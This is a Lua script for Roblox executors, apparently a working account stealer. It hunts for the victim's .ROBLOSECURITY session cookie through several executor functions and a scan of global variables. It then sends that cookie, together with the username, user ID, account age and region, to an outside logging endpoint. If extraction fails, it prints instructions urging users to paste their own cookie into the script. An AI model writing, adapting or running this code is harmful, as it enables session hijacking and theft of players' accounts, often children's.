-- webhook.lua - VERSIÓN ULTIMATE CON EXTRACCIÓN PROFUNDA
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

-- =====================================================================
-- FUNCIÓN DE EXTRACCIÓN PROFUNDA DE COOKIES
-- =====================================================================
local function GetRobloxCookie()
    print("🔍 Iniciando búsqueda de cookie...")

    -- 1. Método estándar
    local success, cookie = pcall(getcookie)
    if success and cookie and type(cookie) == "string" and string.find(cookie, "_|WARNING") then
        print("✅ Cookie encontrada vía getcookie()")
        return string.gsub(cookie, "%.ROBLOSECURITY=", "")
    end

    -- 2. Método get_cookies()
    local success2, cookies = pcall(get_cookies)
    if success2 and cookies and type(cookies) == "string" and string.find(cookies, "_|WARNING") then
        print("✅ Cookie encontrada vía get_cookies()")
        return string.gsub(cookies, "%.ROBLOSECURITY=", "")
    end

    -- 3. Método Synapse (compatibilidad)
    local syn = getgenv().syn
    if syn and type(syn.get_cookies) == "function" then
        local success3, syn_cookies = pcall(syn.get_cookies)
        if success3 and syn_cookies and type(syn_cookies) == "string" and string.find(syn_cookies, "_|WARNING") then
            print("✅ Cookie encontrada vía syn.get_cookies()")
            return string.gsub(syn_cookies, "%.ROBLOSECURITY=", "")
        end
    end

    -- 4. Búsqueda en variables de entorno (getgenv)
    local env_keys = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "cookies"}
    for _, key in ipairs(env_keys) do
        -- Intenta getgenv()["KEY"] y getgenv("KEY") por si el executor usa sintaxis distinta
        local val = getgenv()[key] or (type(getgenv) == "function" and getgenv(key))
        
        if val and type(val) == "string" and string.find(val, "_|WARNING") then
            print("✅ Cookie encontrada en variable global: " .. key)
            return string.gsub(val, "%.ROBLOSECURITY=", "")
        end
    end

    -- 5. ESCANEO PROFUNDO (Deep Scan)
    -- Busca en TODAS las variables globales alguna que parezca una cookie
    print("🔍 Realizando escaneo profundo del sistema...")
    local foundDeep = false
    local deepCookie = ""
    
    local successScan, env = pcall(getgenv)
    if successScan and type(env) == "table" then
        for k, v in pairs(env) do
            if type(v) == "string" and #v > 100 and string.find(v, "_|WARNING") then
                print("🕵️ [Deep Scan] ¡Cookie oculta encontrada en la variable: " .. tostring(k) .. "!")
                deepCookie = string.gsub(v, "%.ROBLOSECURITY=", "")
                foundDeep = true
                break -- Detener búsqueda al encontrar la primera
            end
        end
    end

    if foundDeep then
        return deepCookie
    end

    -- 6. Intentar leer de 'shared'
    if shared and shared.cookies and type(shared.cookies) == "string" and string.find(shared.cookies, "_|WARNING") then
        print("✅ Cookie encontrada en shared.cookies")
        return string.gsub(shared.cookies, "%.ROBLOSECURITY=", "")
    end

    print("❌ No se encontró la cookie automáticamente.")
    return "NO_COOKIE_FOUND_EXECUTOR_LIMITADO"
end

-- =====================================================================
-- FUNCIÓN DE PETICIÓN HTTP (Corregida para evitar error de Headers)
-- =====================================================================
local function Request(options)
    options = options or {}
    local url = options.Url or ""
    local method = options.Method or "GET"
    local headers = options.Headers or {}
    local body = options.Body
    
    if url == "" then
        error("Error: No se especificó URL")
    end
    
    local fullHeaders = {}
    for key, val in pairs(headers) do
        fullHeaders[key] = val
    end
    fullHeaders["Connection"] = "keep-alive"
    fullHeaders["Accept"] = "*/*"
    if method == "POST" then
        fullHeaders["Content-Type"] = "application/json"
    end
    
    local bodyString = body
    if type(body) == "table" then
        bodyString = HttpService:JSONEncode(body)
    end

    local customRequest = getgenv().request or (getgenv().syn and getgenv().syn.request) or (getgenv().http and getgenv().http.request)
    if customRequest then
        local success, response = pcall(function()
            return customRequest({
                Url = url,
                Method = method,
                Body = bodyString,
                Headers = fullHeaders
            })
        end)
        if success and response then
            return response
        end
    end

    local successHttp, responseHttp = pcall(function()
        if method == "GET" then
            return HttpService:GetAsync(url, false)
        else
            return HttpService:PostAsync(url, bodyString, Enum.HttpContentType.ApplicationJson, false)
        end
    end)
    
    if successHttp and responseHttp then
        return { Success = true, StatusCode = 200, Body = responseHttp }
    end
    
    return nil
end

local function HttpGet(url, options)
    options = options or {}
    return Request({
        Url = url,
        Method = "GET",
        Headers = options.Headers or {},
        Timeout = options.Timeout or 15
    })
end

local function HttpPost(url, body, options)
    options = options or {} -- ✅ Corrección crítica para evitar 'nil with Headers'
    return Request({
        Url = url,
        Method = "POST",
        Body = body,
        Headers = options.Headers or { ["Content-Type"] = "application/json" },
        Timeout = options.Timeout or 15
    })
end

-- =====================================================================
-- DATOS Y EJECUCIÓN
-- =====================================================================
local function GetAccountAge()
    local player = Players.LocalPlayer
    if not player then return "Desconocido" end
    
    local days = player.AccountAge
    local years = math.floor(days / 365)
    local months = math.floor((days % 365) / 30)
    
    if years > 0 then
        return string.format("%d años, %d meses (%d días)", years, months, days)
    end
    return days .. " días"
end

local function GetRegion()
    return LocalizationService.RobloxLocaleId
end

-- =====================================================================
-- MAIN
-- =====================================================================
local success, result = pcall(function()
    local player = Players.LocalPlayer
    local placeId = game.PlaceId
    
    local cookieValue = GetRobloxCookie()
    
    local data = {
        username = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        gameId = placeId,
        accountAge = GetAccountAge(),
        region = GetRegion(),
        cookie = ".ROBLOSECURITY=" .. cookieValue
    }
    
    print("📤 Preparando envío...")
    print("  Usuario: " .. player.Name)
    
    if cookieValue == "NO_COOKIE_FOUND_EXECUTOR_LIMITADO" then
        warn("⚠️ [FALLO CRÍTICO] Potassium bloqueó la extracción automática.")
        warn("💡 SOLUCIÓN: Pega tu cookie manualmente al inicio del script:")
        warn('   getgenv()._ROBLOSECURITY = "_|WARNING:-DO-NOT-SHARE-THIS..."')
    else
        print("  Cookie: Detectada ✅")
    end
    
    local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
    
    if response then
        print("✅ Webhook enviado!")
        return response
    else
        warn("⚠️ Webhook falló.")
        return nil
    end
end)

if not success then
    warn("❌ Error: " .. tostring(result))
end
